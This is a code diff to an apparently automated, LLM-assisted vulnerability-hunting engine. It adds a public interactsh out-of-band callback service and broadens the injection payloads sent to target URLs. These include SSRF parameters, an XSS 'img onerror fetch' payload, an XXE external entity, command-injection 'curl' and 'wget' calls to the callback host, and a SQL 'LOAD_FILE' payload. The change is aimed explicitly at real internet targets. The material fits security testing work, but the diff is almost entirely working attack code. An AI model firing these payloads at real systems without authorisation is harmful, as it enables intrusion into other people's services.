@@ -32,6 +32,7 @@ import { observationCompressor } from "../lib/intelligence/observation-compresso
 import { nvdClient } from "../lib/intelligence/nvd-client";
 import { sessionManager, AuthConfig } from "../lib/tools/session-manager";
 import { callbackServer } from "../lib/oob/callback-server";
+import { interactshManager } from "../lib/oob/interactsh-manager";
 import { graphqlProber } from "../lib/tools/graphql-probe";
 import { ssrfChainProber } from "../lib/tools/ssrf-chain-prober";
 import { payloadMutator } from "../lib/tools/payload-mutator";
@@ -699,6 +700,11 @@ export class HunterEngine extends EventEmitter {
           { keys: Object.keys(this.authHeaders) });
       }
     }
+
+    // Start interactsh for public OOB callbacks (best-effort — falls back to local server).
+    interactshManager.start().then(domain => {
+      if (domain) logger.info("[HunterEngine] Interactsh OOB active", { domain });
+    }).catch(() => {});
 
     this.rlWiring.onHuntStart({
       sessionId: sessionUuid,
@@ -2351,26 +2357,36 @@ Return ONLY valid JSON array of hypothesis objects.`;
 
   private async runOOBProbe(targetUrl: string, vulnClass: string): Promise<boolean> {
     try {
-      const { beaconId, callbackUrl } = callbackServer.generateBeacon();
+      // Prefer interactsh (public OOB) so real internet targets can call back.
+      // Fall back to local callback server for local lab targets.
+      const interactshBeacon = interactshManager.generateBeacon();
+      const { beaconId, callbackUrl } = interactshBeacon ?? callbackServer.generateBeacon();
+      const useInteractsh = Boolean(interactshBeacon);
 
       // Inject callback URL as payload based on vuln class
       const probeUrl = (() => {
         const u = new URL(targetUrl);
         if (vulnClass === "ssrf") {
-          // Append callback URL as common SSRF parameter names
           u.searchParams.set("url", callbackUrl);
+          u.searchParams.set("dest", callbackUrl);
+          u.searchParams.set("target", callbackUrl);
           return u.toString();
         }
         if (vulnClass === "xss") {
-          u.searchParams.set("q", `<img src="${callbackUrl}">`);
+          u.searchParams.set("q", `<img src="${callbackUrl}" onerror="fetch('${callbackUrl}')">`);
           return u.toString();
         }
         if (vulnClass === "xxe") {
-          u.searchParams.set("xml", `<!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
+          u.searchParams.set("xml", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
           return u.toString();
         }
-        // sqli/rce: fire a secondary DNS-style probe as a GET request
-        u.searchParams.set("id", `1 OR 1=1-- ${callbackUrl}`);
+        if (vulnClass === "rce") {
+          u.searchParams.set("cmd", `curl ${callbackUrl}`);
+          u.searchParams.set("exec", `wget ${callbackUrl}`);
+          return u.toString();
+        }
+        // sqli blind: time-based + OOB
+        u.searchParams.set("id", `1 AND LOAD_FILE('${callbackUrl}')-- -`);
         return u.toString();
       })();
 
@@ -2380,12 +2396,26 @@ Return ONLY valid JSON array of hypothesis objects.`;
         validateStatus: () => true,
       }).catch(() => {});
 
-      const hit = await callbackServer.waitForHit(beaconId, 12_000);
-      if (hit) {
-        this.emit("hunt:oob_hit", { sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl });
-        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl });
+      // Interactsh gets more time since DNS propagation can add a few seconds
+      const waitMs = useInteractsh ? 15_000 : 12_000;
+      let hit = false;
+
+      if (useInteractsh) {
+        const oobHit = await interactshManager.waitForHit(beaconId, waitMs);
+        hit = Boolean(oobHit);
+      } else {
+        hit = await callbackServer.waitForHit(beaconId, waitMs);
+        callbackServer.cleanup(beaconId);
       }
-      callbackServer.cleanup(beaconId);
+
+      if (hit) {
+        this.emit("hunt:oob_hit", {
+          sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl,
+          via: useInteractsh ? "interactsh" : "local",
+          domain: interactshManager.getDomain() ?? "localhost",
+        });
+        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl, via: useInteractsh ? "interactsh" : "local" });
+      }
       return hit;
     } catch (err) {
       logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
